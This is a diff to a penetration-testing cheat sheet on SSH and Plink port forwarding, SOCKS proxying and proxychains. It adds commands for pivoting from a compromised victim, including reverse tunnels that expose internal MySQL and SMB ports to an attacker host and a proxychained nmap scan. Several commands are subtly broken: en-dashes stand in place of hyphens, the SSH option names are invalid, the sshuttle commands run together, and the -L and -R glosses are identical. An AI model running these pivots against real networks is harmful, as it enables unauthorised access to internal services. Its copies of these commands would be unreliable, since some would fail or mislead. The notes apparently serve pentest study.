@@ -8,6 +8,75 @@ We use port redirection and/or tunneling when we want to forward a port that's l
 
 We can use SSH to perform port redirection and tunneling
 
+Key Concepts to avoid confusion:
+
+* -L = Your host port \(L = Local\)
+* -R = Your host port \(R = Remote\)
+* &lt;IP&gt;:3306 = The IP and PORT from the target
+
+### Local Port Forwarding
+
+Things to consider:
+
+* Have SSH access with low privileges? 
+* There are some ports open internally? 
+
+Try local port forwarding:
+
+```text
+ssh –L 3306:<IP>:3306 user@$target_ip
+```
+
+### Remote Port Forwarding
+
+Things to consider:
+
+* No SSH Access but limited shell? 
+* Also, some weird port is open on local-host? 
+
+Try remote port forwarding:
+
+```text
+ssh –R 3306:localhost:3306 root@kali_ip
+ssh –R 3306:localhost:3306 -o "UserKnownHostFile=/dev/null" -o "UserHostKeyChecking=no" root@kali_ip
+```
+
+Connect to the tunneled port:
+
+```text
+#Verify with nc
+nc -vvv localhost 3306
+
+#If mysql
+mysql -u username -p -h 127.0.0.1 -P 3306
+```
+
+### Dynamic Port Forwarding \(Socks4\)
+
+Dynamic Port Forwarding from victim machine\(Socks Proxy\):
+
+```text
+ssh -D 8080 -f -N user@$target_ip
+```
+
+With Dynamic Port Forwarding we can access/browse any IP range of the victim machine. We just need to configure proxychains.conf as follows:
+
+```text
+nano /etc/proxychains.conf
+...
+.
+.
+....
+socks4  127.0.0.1 8080
+```
+
+Now we can use any application through proxychains… such as:
+
+```text
+proxychains firefox
+proxychains nmap -sT -Pn -p139,445 $ip
+```
+
 #### SOCKS Proxy
 
 ```text
@@ -22,7 +91,6 @@ Cool Tip: Konami SSH Port forwarding
 
 ```text
 [ENTER] + [~C]
--D 1090
 ```
 
 #### Local Port Forwarding
@@ -44,6 +112,14 @@ You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a
 
 ```text
 pip install sshuttlesshuttle -r user@host 10.10.10.10/24
+```
+
+## Plink
+
+Remote port forwarding using Plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:
+
+```text
+plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
 ```
 
 ## Chisel <a id="chisel"></a>
